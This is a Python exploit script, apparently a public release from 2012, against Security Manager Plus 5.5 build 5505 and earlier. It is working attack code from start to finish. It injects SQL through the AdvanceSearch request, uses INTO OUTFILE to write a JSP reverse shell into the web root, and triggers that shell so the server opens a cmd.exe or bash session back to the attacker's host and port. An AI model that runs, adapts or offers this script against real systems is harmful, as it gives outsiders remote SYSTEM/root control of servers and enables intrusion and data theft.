import urllib, urllib2, cookielib
import sys
import random
 
if (len(sys.argv) != 5):
    print ""
    print "[*] Security Manager Plus 5.5 build 5505 and lower Remote SYSTEM/root SQLi exploit (Windows+Linux) - xistence (xistence<[at]>0x90.nl) - 2012-05-29"
    print ""
    print "[*] Usage: secman-sql.py <RHOST> <LHOST> <LPORT> <OS>"
    print "[*] I.e.:  ./secman-sql.py www.linux.org 192.168.2.66 8888 linux"
    print "[*] I.e.:  ./secman-sql.py www.microsoft.com 192.168.2.66 8888 win"
    print "[*]"
    print "[*] RHOST = Remote Host which runs Security Manager Plus"
    print "[*] LHOST = IP address of local machine (machine where you run the exploit from"
    print "[*] LPORT = Port on the local machine where you will run NC on for our reverse shell"
    print "[*] OS = linux/win"
    print ""
    print ""
    exit(0)
 
rhost = sys.argv[1]
lhost = sys.argv[2]
lport = sys.argv[3]
osys = sys.argv[4]
 
if osys == 'linux':
    command = "/bin/bash"
elif osys == 'win':
    command = "cmd.exe"
else:
    print "Choose a valid OS, linux/win"
    exit()
     
 
filename = ''
for i in random.sample('abcdefghijklmnopqrstuvwxyz1234567890',6):
    filename+=i
filename +=".jsp"
 
output_path = "../../webapps/SecurityManager/%s" %filename
 
jsp = '''           <%@page import="java.lang.*"%>
            <%@page import="java.util.*"%>
            <%@page import="java.io.*"%>
            <%@page import="java.net.*"%>
 
            <%
                class StreamConnector extends Thread
                {
                    InputStream is;
                    OutputStream os;
 
                    StreamConnector( InputStream is, OutputStream os )
                    {
                        this.is = is;
                        this.os = os;
                    }
 
                    public void run()
                    {
                        BufferedReader in  = null;
                        BufferedWriter out = null;
                        try
                        {
                            in  = new BufferedReader( new InputStreamReader( this.is ) );
                            out = new BufferedWriter( new OutputStreamWriter( this.os ) );
                            char buffer[] = new char[8192];
                            int length;
                            while( ( length = in.read( buffer, 0, buffer.length ) ) > 0 )
                            {
                                out.write( buffer, 0, length );
                                out.flush();
                            }
                        } catch( Exception e ){}
                        try
                        {
                            if( in != null )
                                in.close();
                            if( out != null )
                                out.close();
                        } catch( Exception e ){}
                    }
                }
 
                try
                {
                    Socket socket = new Socket( "''' + lhost +'''", '''+lport+''' );
                    Process process = Runtime.getRuntime().exec( "'''+command+'''" );
                    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
                    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
                } catch( Exception e ) {}
            %>'''
 
 
jsp = jsp.replace("\n","")
jsp = jsp.replace("\t","")
 
payload = "1)) "
payload += 'UNION SELECT 0x%s,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,21,22,23,24,25,26,27,28,29 INTO OUTFILE "%s"' % (jsp.encode('hex'),output_path)
payload += " FROM mysql.user WHERE 1=((1"
 
opener = urllib2.build_opener()
opener.addheaders.append(('Cookie', 'STATE_COOKIE=%26SecurityManager%2FID%2F174%2FHomePageSubDAC_LIST%2F223%2FSecurityManager_CONTENTAREA_LIST%2F226%2FMainDAC_LIST%2F166%26MainTabs%2FID%2F167%2F_PV%2F174%2FselectedView%2FHome%26Home%2FID%2F166%2FPDCA%2FMainDAC%2F_PV%2F174%26HomePageSub%2FID%2F226%2FPDCA%2FSecurityManager_CONTENTAREA%2F_PV%2F166%26HomePageSubTab%2FID%2F225%2F_PV%2F226%2FselectedView%2FHomePageSecurity%26HomePageSecurity%2FID%2F223%2FPDCA%2FHomePageSubDAC%2F_PV%2F226%26_REQS%2F_RVID%2FSecurityManager%2F_TIME%2F31337; 2RequestsshowThreadedReq=showThreadedReqshow; 2RequestshideThreadedReq=hideThreadedReqhide;'))
post_params = urllib.urlencode({'ANDOR' : 'and', 'condition_1' : 'OpenPorts@PORT','operator_1' : 'IN', 'value_1' : payload, 'COUNT' : '1'})
 
print "[*] Sending evil payload"
resp = opener.open("http://%s:6262/STATE_ID/31337/jsp/xmlhttp/persistence.jsp?reqType=AdvanceSearch&SUBREQUEST=XMLHTTP" %rhost, post_params)
print "[*] Created Reverse JSP shell http://%s:6262/%s" % (rhost,filename)
resp = opener.open("http://%s:6262/%s"  % (rhost,filename))
print "[*] Check your shell on %s %s\n" % (lhost,lport)
